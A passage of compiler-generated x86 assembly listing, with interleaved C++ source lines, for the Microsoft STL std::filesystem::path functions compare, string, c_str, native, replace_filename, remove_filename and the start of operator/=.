  0000c	e8 00 00 00 00	 call	 ?data@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QBEPB_WXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::data
  00011	89 45 dc	 mov	 DWORD PTR __My_first$[ebp], eax

; 1028 :             const auto _My_last             = _My_first + _Text.size();

  00014	8b 4d d0	 mov	 ecx, DWORD PTR _this$[ebp]
  00017	e8 00 00 00 00	 call	 ?size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QBEIXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::size
  0001c	8b 4d dc	 mov	 ecx, DWORD PTR __My_first$[ebp]
  0001f	8d 14 41	 lea	 edx, DWORD PTR [ecx+eax*2]
  00022	89 55 e8	 mov	 DWORD PTR __My_last$[ebp], edx

; 1029 :             const auto _My_root_name_end    = _Find_root_name_end(_My_first, _My_last);

  00025	8b 45 e8	 mov	 eax, DWORD PTR __My_last$[ebp]
  00028	50		 push	 eax
  00029	8b 4d dc	 mov	 ecx, DWORD PTR __My_first$[ebp]
  0002c	51		 push	 ecx
  0002d	e8 00 00 00 00	 call	 ?_Find_root_name_end@filesystem@std@@YAPB_WQB_W0@Z ; std::filesystem::_Find_root_name_end
  00032	83 c4 08	 add	 esp, 8
  00035	89 45 d8	 mov	 DWORD PTR __My_root_name_end$[ebp], eax

; 1030 :             const auto _Other_first         = _Other.data();

  00038	8d 4d 08	 lea	 ecx, DWORD PTR __Other$[ebp]
  0003b	e8 00 00 00 00	 call	 ?data@?$basic_string_view@_WU?$char_traits@_W@std@@@std@@QBEPB_WXZ ; std::basic_string_view<wchar_t,std::char_traits<wchar_t> >::data
  00040	89 45 e0	 mov	 DWORD PTR __Other_first$[ebp], eax

; 1031 :             const auto _Other_last          = _Other_first + _Other.size();

  00043	8d 4d 08	 lea	 ecx, DWORD PTR __Other$[ebp]
  00046	e8 00 00 00 00	 call	 ?size@?$basic_string_view@_WU?$char_traits@_W@std@@@std@@QBEIXZ ; std::basic_string_view<wchar_t,std::char_traits<wchar_t> >::size
  0004b	8b 55 e0	 mov	 edx, DWORD PTR __Other_first$[ebp]
  0004e	8d 04 42	 lea	 eax, DWORD PTR [edx+eax*2]
  00051	89 45 e4	 mov	 DWORD PTR __Other_last$[ebp], eax

; 1032 :             const auto _Other_root_name_end = _Find_root_name_end(_Other_first, _Other_last);

  00054	8b 4d e4	 mov	 ecx, DWORD PTR __Other_last$[ebp]
  00057	51		 push	 ecx
  00058	8b 55 e0	 mov	 edx, DWORD PTR __Other_first$[ebp]
  0005b	52		 push	 edx
  0005c	e8 00 00 00 00	 call	 ?_Find_root_name_end@filesystem@std@@YAPB_WQB_W0@Z ; std::filesystem::_Find_root_name_end
  00061	83 c4 08	 add	 esp, 8
  00064	89 45 d4	 mov	 DWORD PTR __Other_root_name_end$[ebp], eax

; 1033 : 
; 1034 :             // Let rootNameComparison be the result of this->root_name().native().compare(_Other.root_name().native())
; 1035 :             const int _Root_cmp = _Range_compare(_My_first, _My_root_name_end, _Other_first, _Other_root_name_end);

  00067	8b 45 d4	 mov	 eax, DWORD PTR __Other_root_name_end$[ebp]
  0006a	50		 push	 eax
  0006b	8b 4d e0	 mov	 ecx, DWORD PTR __Other_first$[ebp]
  0006e	51		 push	 ecx
  0006f	8b 55 d8	 mov	 edx, DWORD PTR __My_root_name_end$[ebp]
  00072	52		 push	 edx
  00073	8b 45 dc	 mov	 eax, DWORD PTR __My_first$[ebp]
  00076	50		 push	 eax
  00077	e8 00 00 00 00	 call	 ?_Range_compare@filesystem@std@@YAHQB_W000@Z ; std::filesystem::_Range_compare
  0007c	83 c4 10	 add	 esp, 16			; 00000010H
  0007f	89 45 cc	 mov	 DWORD PTR __Root_cmp$[ebp], eax

; 1036 :             if (_Root_cmp != 0) { // If rootNameComparison is not 0, rootNameComparison

  00082	83 7d cc 00	 cmp	 DWORD PTR __Root_cmp$[ebp], 0
  00086	74 08		 je	 SHORT $LN5@compare

; 1037 :                 return _Root_cmp;

  00088	8b 45 cc	 mov	 eax, DWORD PTR __Root_cmp$[ebp]
  0008b	e9 84 01 00 00	 jmp	 $LN3@compare
$LN5@compare:

; 1038 :             }
; 1039 : 
; 1040 :             auto _My_relative               = _STD find_if_not(_My_root_name_end, _My_last, _Is_slash);

  00090	0f b6 0d 00 00
	00 00		 movzx	 ecx, BYTE PTR ?_Is_slash@filesystem@std@@3U_Is_slash_oper@12@B ; std::filesystem::_Is_slash
  00097	51		 push	 ecx
  00098	8b 55 e8	 mov	 edx, DWORD PTR __My_last$[ebp]
  0009b	52		 push	 edx
  0009c	8b 45 d8	 mov	 eax, DWORD PTR __My_root_name_end$[ebp]
  0009f	50		 push	 eax
  000a0	e8 00 00 00 00	 call	 ??$find_if_not@PB_WU_Is_slash_oper@filesystem@std@@@std@@YAPB_WPB_WQB_WU_Is_slash_oper@filesystem@0@@Z ; std::find_if_not<wchar_t const *,std::filesystem::_Is_slash_oper>
  000a5	83 c4 0c	 add	 esp, 12			; 0000000cH
  000a8	89 45 f0	 mov	 DWORD PTR __My_relative$[ebp], eax

; 1041 :             auto _Other_relative            = _STD find_if_not(_Other_root_name_end, _Other_last, _Is_slash);

  000ab	0f b6 0d 00 00
	00 00		 movzx	 ecx, BYTE PTR ?_Is_slash@filesystem@std@@3U_Is_slash_oper@12@B ; std::filesystem::_Is_slash
  000b2	51		 push	 ecx
  000b3	8b 55 e4	 mov	 edx, DWORD PTR __Other_last$[ebp]
  000b6	52		 push	 edx
  000b7	8b 45 d4	 mov	 eax, DWORD PTR __Other_root_name_end$[ebp]
  000ba	50		 push	 eax
  000bb	e8 00 00 00 00	 call	 ??$find_if_not@PB_WU_Is_slash_oper@filesystem@std@@@std@@YAPB_WPB_WQB_WU_Is_slash_oper@filesystem@0@@Z ; std::find_if_not<wchar_t const *,std::filesystem::_Is_slash_oper>
  000c0	83 c4 0c	 add	 esp, 12			; 0000000cH
  000c3	89 45 ec	 mov	 DWORD PTR __Other_relative$[ebp], eax

; 1042 :             const bool _My_has_root_name    = _My_root_name_end != _My_relative;

  000c6	8b 4d d8	 mov	 ecx, DWORD PTR __My_root_name_end$[ebp]
  000c9	3b 4d f0	 cmp	 ecx, DWORD PTR __My_relative$[ebp]
  000cc	74 06		 je	 SHORT $LN13@compare
  000ce	c6 45 ff 01	 mov	 BYTE PTR tv131[ebp], 1
  000d2	eb 04		 jmp	 SHORT $LN14@compare
$LN13@compare:
  000d4	c6 45 ff 00	 mov	 BYTE PTR tv131[ebp], 0
$LN14@compare:
  000d8	8a 55 ff	 mov	 dl, BYTE PTR tv131[ebp]
  000db	88 55 f9	 mov	 BYTE PTR __My_has_root_name$[ebp], dl

; 1043 :             const bool _Other_has_root_name = _Other_root_name_end != _Other_relative;

  000de	8b 45 d4	 mov	 eax, DWORD PTR __Other_root_name_end$[ebp]
  000e1	3b 45 ec	 cmp	 eax, DWORD PTR __Other_relative$[ebp]
  000e4	74 06		 je	 SHORT $LN15@compare
  000e6	c6 45 fe 01	 mov	 BYTE PTR tv133[ebp], 1
  000ea	eb 04		 jmp	 SHORT $LN16@compare
$LN15@compare:
  000ec	c6 45 fe 00	 mov	 BYTE PTR tv133[ebp], 0
$LN16@compare:
  000f0	8a 4d fe	 mov	 cl, BYTE PTR tv133[ebp]
  000f3	88 4d f8	 mov	 BYTE PTR __Other_has_root_name$[ebp], cl

; 1044 :             // If !this->has_root_directory() and _Other.has_root_directory(), a value less than 0
; 1045 :             // If this->has_root_directory() and !_Other.has_root_directory(), a value greater than 0
; 1046 :             const int _Root_name_cmp = _My_has_root_name - _Other_has_root_name;

  000f6	0f b6 55 f9	 movzx	 edx, BYTE PTR __My_has_root_name$[ebp]
  000fa	0f b6 45 f8	 movzx	 eax, BYTE PTR __Other_has_root_name$[ebp]
  000fe	2b d0		 sub	 edx, eax
  00100	89 55 c8	 mov	 DWORD PTR __Root_name_cmp$[ebp], edx

; 1047 :             if (_Root_name_cmp != 0) {

  00103	74 08		 je	 SHORT $LN6@compare

; 1048 :                 return _Root_name_cmp;

  00105	8b 45 c8	 mov	 eax, DWORD PTR __Root_name_cmp$[ebp]
  00108	e9 07 01 00 00	 jmp	 $LN3@compare
$LN6@compare:
$LN2@compare:

; 1049 :             }
; 1050 : 
; 1051 :             // Otherwise, lexicographic by element
; 1052 :             for (;;) {
; 1053 :                 const bool _My_empty    = _My_relative == _My_last;

  0010d	8b 4d f0	 mov	 ecx, DWORD PTR __My_relative$[ebp]
  00110	3b 4d e8	 cmp	 ecx, DWORD PTR __My_last$[ebp]
  00113	75 06		 jne	 SHORT $LN17@compare
  00115	c6 45 fd 01	 mov	 BYTE PTR tv139[ebp], 1
  00119	eb 04		 jmp	 SHORT $LN18@compare
$LN17@compare:
  0011b	c6 45 fd 00	 mov	 BYTE PTR tv139[ebp], 0
$LN18@compare:
  0011f	8a 55 fd	 mov	 dl, BYTE PTR tv139[ebp]
  00122	88 55 fb	 mov	 BYTE PTR __My_empty$7[ebp], dl

; 1054 :                 const bool _Other_empty = _Other_relative == _Other_last;

  00125	8b 45 ec	 mov	 eax, DWORD PTR __Other_relative$[ebp]
  00128	3b 45 e4	 cmp	 eax, DWORD PTR __Other_last$[ebp]
  0012b	75 06		 jne	 SHORT $LN19@compare
  0012d	c6 45 fc 01	 mov	 BYTE PTR tv141[ebp], 1
  00131	eb 04		 jmp	 SHORT $LN20@compare
$LN19@compare:
  00133	c6 45 fc 00	 mov	 BYTE PTR tv141[ebp], 0
$LN20@compare:
  00137	8a 4d fc	 mov	 cl, BYTE PTR tv141[ebp]
  0013a	88 4d f7	 mov	 BYTE PTR __Other_empty$5[ebp], cl

; 1055 :                 const int _Empty_cmp    = _Other_empty - _My_empty;

  0013d	0f b6 55 f7	 movzx	 edx, BYTE PTR __Other_empty$5[ebp]
  00141	0f b6 45 fb	 movzx	 eax, BYTE PTR __My_empty$7[ebp]
  00145	2b d0		 sub	 edx, eax
  00147	89 55 c4	 mov	 DWORD PTR __Empty_cmp$3[ebp], edx

; 1056 :                 if (_My_empty || _Empty_cmp != 0) {

  0014a	0f b6 4d fb	 movzx	 ecx, BYTE PTR __My_empty$7[ebp]
  0014e	85 c9		 test	 ecx, ecx
  00150	75 06		 jne	 SHORT $LN8@compare
  00152	83 7d c4 00	 cmp	 DWORD PTR __Empty_cmp$3[ebp], 0
  00156	74 08		 je	 SHORT $LN7@compare
$LN8@compare:

; 1057 :                     return _Empty_cmp;

  00158	8b 45 c4	 mov	 eax, DWORD PTR __Empty_cmp$3[ebp]
  0015b	e9 b4 00 00 00	 jmp	 $LN3@compare
$LN7@compare:

; 1058 :                 }
; 1059 : 
; 1060 :                 const bool _My_slash    = _Is_slash(*_My_relative);

  00160	8b 55 f0	 mov	 edx, DWORD PTR __My_relative$[ebp]
  00163	0f b7 02	 movzx	 eax, WORD PTR [edx]
  00166	50		 push	 eax
  00167	b9 00 00 00 00	 mov	 ecx, OFFSET ?_Is_slash@filesystem@std@@3U_Is_slash_oper@12@B ; std::filesystem::_Is_slash
  0016c	e8 00 00 00 00	 call	 ??R_Is_slash_oper@filesystem@std@@QBE_N_W@Z ; std::filesystem::_Is_slash_oper::operator()
  00171	88 45 fa	 mov	 BYTE PTR __My_slash$6[ebp], al

; 1061 :                 const bool _Other_slash = _Is_slash(*_Other_relative);

  00174	8b 4d ec	 mov	 ecx, DWORD PTR __Other_relative$[ebp]
  00177	0f b7 11	 movzx	 edx, WORD PTR [ecx]
  0017a	52		 push	 edx
  0017b	b9 00 00 00 00	 mov	 ecx, OFFSET ?_Is_slash@filesystem@std@@3U_Is_slash_oper@12@B ; std::filesystem::_Is_slash
  00180	e8 00 00 00 00	 call	 ??R_Is_slash_oper@filesystem@std@@QBE_N_W@Z ; std::filesystem::_Is_slash_oper::operator()
  00185	88 45 f6	 mov	 BYTE PTR __Other_slash$4[ebp], al

; 1062 :                 const int _Slash_cmp    = _Other_slash - _My_slash;

  00188	0f b6 45 f6	 movzx	 eax, BYTE PTR __Other_slash$4[ebp]
  0018c	0f b6 4d fa	 movzx	 ecx, BYTE PTR __My_slash$6[ebp]
  00190	2b c1		 sub	 eax, ecx
  00192	89 45 c0	 mov	 DWORD PTR __Slash_cmp$2[ebp], eax

; 1063 :                 if (_Slash_cmp != 0) {

  00195	74 05		 je	 SHORT $LN9@compare

; 1064 :                     return _Slash_cmp;

  00197	8b 45 c0	 mov	 eax, DWORD PTR __Slash_cmp$2[ebp]
  0019a	eb 78		 jmp	 SHORT $LN3@compare
$LN9@compare:

; 1065 :                 }
; 1066 : 
; 1067 :                 if (_My_slash) { // comparing directory-separator

  0019c	0f b6 55 fa	 movzx	 edx, BYTE PTR __My_slash$6[ebp]
  001a0	85 d2		 test	 edx, edx
  001a2	74 41		 je	 SHORT $LN10@compare

; 1068 :                     _My_relative    = _STD find_if_not(_My_relative + 1, _My_last, _Is_slash);

  001a4	0f b6 05 00 00
	00 00		 movzx	 eax, BYTE PTR ?_Is_slash@filesystem@std@@3U_Is_slash_oper@12@B ; std::filesystem::_Is_slash
  001ab	50		 push	 eax
  001ac	8b 4d e8	 mov	 ecx, DWORD PTR __My_last$[ebp]
  001af	51		 push	 ecx
  001b0	8b 55 f0	 mov	 edx, DWORD PTR __My_relative$[ebp]
  001b3	83 c2 02	 add	 edx, 2
  001b6	52		 push	 edx
  001b7	e8 00 00 00 00	 call	 ??$find_if_not@PB_WU_Is_slash_oper@filesystem@std@@@std@@YAPB_WPB_WQB_WU_Is_slash_oper@filesystem@0@@Z ; std::find_if_not<wchar_t const *,std::filesystem::_Is_slash_oper>
  001bc	83 c4 0c	 add	 esp, 12			; 0000000cH
  001bf	89 45 f0	 mov	 DWORD PTR __My_relative$[ebp], eax

; 1069 :                     _Other_relative = _STD find_if_not(_Other_relative + 1, _Other_last, _Is_slash);

  001c2	0f b6 05 00 00
	00 00		 movzx	 eax, BYTE PTR ?_Is_slash@filesystem@std@@3U_Is_slash_oper@12@B ; std::filesystem::_Is_slash
  001c9	50		 push	 eax
  001ca	8b 4d e4	 mov	 ecx, DWORD PTR __Other_last$[ebp]
  001cd	51		 push	 ecx
  001ce	8b 55 ec	 mov	 edx, DWORD PTR __Other_relative$[ebp]
  001d1	83 c2 02	 add	 edx, 2
  001d4	52		 push	 edx
  001d5	e8 00 00 00 00	 call	 ??$find_if_not@PB_WU_Is_slash_oper@filesystem@std@@@std@@YAPB_WPB_WQB_WU_Is_slash_oper@filesystem@0@@Z ; std::find_if_not<wchar_t const *,std::filesystem::_Is_slash_oper>
  001da	83 c4 0c	 add	 esp, 12			; 0000000cH
  001dd	89 45 ec	 mov	 DWORD PTR __Other_relative$[ebp], eax

; 1070 :                     continue;

  001e0	e9 28 ff ff ff	 jmp	 $LN2@compare
$LN10@compare:

; 1071 :                 }
; 1072 : 
; 1073 :                 const int _Cmp = *_My_relative - *_Other_relative;

  001e5	8b 45 f0	 mov	 eax, DWORD PTR __My_relative$[ebp]
  001e8	0f b7 08	 movzx	 ecx, WORD PTR [eax]
  001eb	8b 55 ec	 mov	 edx, DWORD PTR __Other_relative$[ebp]
  001ee	0f b7 02	 movzx	 eax, WORD PTR [edx]
  001f1	2b c8		 sub	 ecx, eax
  001f3	89 4d bc	 mov	 DWORD PTR __Cmp$1[ebp], ecx

; 1074 :                 if (_Cmp != 0) {

  001f6	74 05		 je	 SHORT $LN11@compare

; 1075 :                     return _Cmp;

  001f8	8b 45 bc	 mov	 eax, DWORD PTR __Cmp$1[ebp]
  001fb	eb 17		 jmp	 SHORT $LN3@compare
$LN11@compare:

; 1076 :                 }
; 1077 : 
; 1078 :                 ++_My_relative;

  001fd	8b 4d f0	 mov	 ecx, DWORD PTR __My_relative$[ebp]
  00200	83 c1 02	 add	 ecx, 2
  00203	89 4d f0	 mov	 DWORD PTR __My_relative$[ebp], ecx

; 1079 :                 ++_Other_relative;

  00206	8b 55 ec	 mov	 edx, DWORD PTR __Other_relative$[ebp]
  00209	83 c2 02	 add	 edx, 2
  0020c	89 55 ec	 mov	 DWORD PTR __Other_relative$[ebp], edx

; 1080 :             }

  0020f	e9 f9 fe ff ff	 jmp	 $LN2@compare
$LN3@compare:

; 1081 :         }

  00214	8b e5		 mov	 esp, ebp
  00216	5d		 pop	 ebp
  00217	c2 08 00	 ret	 8
?compare@path@filesystem@std@@QBEHV?$basic_string_view@_WU?$char_traits@_W@std@@@3@@Z ENDP ; std::filesystem::path::compare
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ?compare@path@filesystem@std@@QBEHABV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@3@@Z
_TEXT	SEGMENT
$T1 = -12						; size = 8
_this$ = -4						; size = 4
__Other$ = 8						; size = 4
?compare@path@filesystem@std@@QBEHABV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@3@@Z PROC ; std::filesystem::path::compare, COMDAT
; _this$ = ecx

; 1019 :         _NODISCARD int compare(const string_type& _Other) const noexcept /* strengthened */ {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 0c	 sub	 esp, 12			; 0000000cH
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 1020 :             // compare *this with _Other
; 1021 :             return compare(static_cast<wstring_view>(_Other));

  00009	8d 45 f4	 lea	 eax, DWORD PTR $T1[ebp]
  0000c	50		 push	 eax
  0000d	8b 4d 08	 mov	 ecx, DWORD PTR __Other$[ebp]
  00010	e8 00 00 00 00	 call	 ??B?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QBE?AV?$basic_string_view@_WU?$char_traits@_W@std@@@1@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::operator std::basic_string_view<wchar_t,std::char_traits<wchar_t> >
  00015	8b 48 04	 mov	 ecx, DWORD PTR [eax+4]
  00018	51		 push	 ecx
  00019	8b 10		 mov	 edx, DWORD PTR [eax]
  0001b	52		 push	 edx
  0001c	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0001f	e8 00 00 00 00	 call	 ?compare@path@filesystem@std@@QBEHV?$basic_string_view@_WU?$char_traits@_W@std@@@3@@Z ; std::filesystem::path::compare

; 1022 :         }

  00024	8b e5		 mov	 esp, ebp
  00026	5d		 pop	 ebp
  00027	c2 04 00	 ret	 4
?compare@path@filesystem@std@@QBEHABV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@3@@Z ENDP ; std::filesystem::path::compare
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ?string@path@filesystem@std@@QBE?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@3@XZ
_TEXT	SEGMENT
_this$ = -8						; size = 4
$T1 = -1						; size = 1
___$ReturnUdt$ = 8					; size = 4
?string@path@filesystem@std@@QBE?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@3@XZ PROC ; std::filesystem::path::string, COMDAT
; _this$ = ecx

; 939  :         _NODISCARD _STD string string() const { // convert the native path from this instance into a string

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx

; 940  :             return string<char>();

  00009	8d 4d ff	 lea	 ecx, DWORD PTR $T1[ebp]
  0000c	e8 00 00 00 00	 call	 ??0?$allocator@D@std@@QAE@XZ ; std::allocator<char>::allocator<char>
  00011	50		 push	 eax
  00012	8b 45 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebp]
  00015	50		 push	 eax
  00016	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  00019	e8 00 00 00 00	 call	 ??$string@DU?$char_traits@D@std@@V?$allocator@D@2@$0A@@path@filesystem@std@@QBE?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@ABV?$allocator@D@2@@Z ; std::filesystem::path::string<char,std::char_traits<char>,std::allocator<char>,0>
  0001e	8b 45 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebp]

; 941  :         }

  00021	8b e5		 mov	 esp, ebp
  00023	5d		 pop	 ebp
  00024	c2 04 00	 ret	 4
?string@path@filesystem@std@@QBE?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@3@XZ ENDP ; std::filesystem::path::string
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ?c_str@path@filesystem@std@@QBEPB_WXZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?c_str@path@filesystem@std@@QBEPB_WXZ PROC		; std::filesystem::path::c_str, COMDAT
; _this$ = ecx

; 923  :         _NODISCARD const value_type* c_str() const noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 924  :             // return a NTCTS to the internally stored path in the native format
; 925  :             return _Text.c_str();

  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ?c_str@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QBEPB_WXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::c_str

; 926  :         }

  0000f	8b e5		 mov	 esp, ebp
  00011	5d		 pop	 ebp
  00012	c3		 ret	 0
?c_str@path@filesystem@std@@QBEPB_WXZ ENDP		; std::filesystem::path::c_str
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ?native@path@filesystem@std@@QBEABV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@3@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?native@path@filesystem@std@@QBEABV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@3@XZ PROC ; std::filesystem::path::native, COMDAT
; _this$ = ecx

; 918  :         _NODISCARD const string_type& native() const noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 919  :             // return a reference to the internally stored wstring in the native format
; 920  :             return _Text;

  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]

; 921  :         }

  0000a	8b e5		 mov	 esp, ebp
  0000c	5d		 pop	 ebp
  0000d	c3		 ret	 0
?native@path@filesystem@std@@QBEABV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@3@XZ ENDP ; std::filesystem::path::native
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ?replace_filename@path@filesystem@std@@QAEAAV123@ABV123@@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__Replacement$ = 8					; size = 4
?replace_filename@path@filesystem@std@@QAEAAV123@ABV123@@Z PROC ; std::filesystem::path::replace_filename, COMDAT
; _this$ = ecx

; 886  :         path& replace_filename(const path& _Replacement) { // remove any filename from *this and append _Replacement

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 887  :             remove_filename();

  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ?remove_filename@path@filesystem@std@@QAEAAV123@XZ ; std::filesystem::path::remove_filename

; 888  :             return operator/=(_Replacement);

  0000f	8b 45 08	 mov	 eax, DWORD PTR __Replacement$[ebp]
  00012	50		 push	 eax
  00013	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00016	e8 00 00 00 00	 call	 ??_0path@filesystem@std@@QAEAAV012@ABV012@@Z ; std::filesystem::path::operator/=

; 889  :         }

  0001b	8b e5		 mov	 esp, ebp
  0001d	5d		 pop	 ebp
  0001e	c2 04 00	 ret	 4
?replace_filename@path@filesystem@std@@QAEAAV123@ABV123@@Z ENDP ; std::filesystem::path::replace_filename
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ?remove_filename@path@filesystem@std@@QAEAAV123@XZ
_TEXT	SEGMENT
tv84 = -20						; size = 4
__Filename$ = -16					; size = 4
__Last$ = -12						; size = 4
__First$ = -8						; size = 4
_this$ = -4						; size = 4
?remove_filename@path@filesystem@std@@QAEAAV123@XZ PROC	; std::filesystem::path::remove_filename, COMDAT
; _this$ = ecx

; 855  :         path& remove_filename() noexcept /* strengthened */ {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 14	 sub	 esp, 20			; 00000014H
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 856  :             // remove any filename from *this
; 857  :             const auto _First    = _Text.data();

  00009	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000c	e8 00 00 00 00	 call	 ?data@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEPA_WXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::data
  00011	89 45 f8	 mov	 DWORD PTR __First$[ebp], eax

; 858  :             const auto _Last     = _First + _Text.size();

  00014	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00017	e8 00 00 00 00	 call	 ?size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QBEIXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::size
  0001c	8b 4d f8	 mov	 ecx, DWORD PTR __First$[ebp]
  0001f	8d 14 41	 lea	 edx, DWORD PTR [ecx+eax*2]
  00022	89 55 f4	 mov	 DWORD PTR __Last$[ebp], edx

; 859  :             const auto _Filename = _Find_filename(_First, _Last);

  00025	8b 45 f4	 mov	 eax, DWORD PTR __Last$[ebp]
  00028	50		 push	 eax
  00029	8b 4d f8	 mov	 ecx, DWORD PTR __First$[ebp]
  0002c	51		 push	 ecx
  0002d	e8 00 00 00 00	 call	 ?_Find_filename@filesystem@std@@YAPB_WQB_WPB_W@Z ; std::filesystem::_Find_filename
  00032	83 c4 08	 add	 esp, 8
  00035	89 45 f0	 mov	 DWORD PTR __Filename$[ebp], eax

; 860  :             _Text._Orphan_all();

  00038	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0003b	e8 00 00 00 00	 call	 ?_Orphan_all@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEXXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Orphan_all

; 861  :             _Text.erase(static_cast<size_t>(_Filename - _First));

  00040	8b 55 fc	 mov	 edx, DWORD PTR _this$[ebp]
  00043	89 55 ec	 mov	 DWORD PTR tv84[ebp], edx
  00046	8b 45 f0	 mov	 eax, DWORD PTR __Filename$[ebp]
  00049	2b 45 f8	 sub	 eax, DWORD PTR __First$[ebp]
  0004c	d1 f8		 sar	 eax, 1
  0004e	50		 push	 eax
  0004f	8b 4d ec	 mov	 ecx, DWORD PTR tv84[ebp]
  00052	e8 00 00 00 00	 call	 ?erase@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEAAV12@I@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::erase

; 862  :             return *this;

  00057	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]

; 863  :         }

  0005a	8b e5		 mov	 esp, ebp
  0005c	5d		 pop	 ebp
  0005d	c3		 ret	 0
?remove_filename@path@filesystem@std@@QAEAAV123@XZ ENDP	; std::filesystem::path::remove_filename
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ??_0path@filesystem@std@@QAEAAV012@ABV012@@Z
_TEXT	SEGMENT
tv177 = -44						; size = 4
tv168 = -40						; size = 4
tv156 = -36						; size = 4
tv148 = -32						; size = 4
__Other_last$ = -28					; size = 4
__My_last$ = -24					; size = 4
__My_root_name_end$ = -20				; size = 4
__Other_first$ = -16					; size = 4
__My_first$ = -12					; size = 4
__Other_root_name_end$ = -8				; size = 4
_this$ = -4						; size = 4
__Other$ = 8						; size = 4
??_0path@filesystem@std@@QAEAAV012@ABV012@@Z PROC	; std::filesystem::path::operator/=, COMDAT
; _this$ = ecx

; 712  :         path& operator/=(const path& _Other) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 2c	 sub	 esp, 44			; 0000002cH
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 713  :             // set *this to the path lexically resolved by _Other relative to *this
; 714  :             // examples:
; 715  :             // path{"cat"} / "c:/dog"; // yields "c:/dog"
; 716  :             // path{"cat"} / "c:"; // yields "c:"
; 717  :             // path{"c:"} / ""; // yields "c:"
; 718  :             // path{"c:cat"} / "/dog"; // yields "c:/dog"
; 719  :             // path{"c:cat"} / "c:dog"; // yields "c:cat/dog"
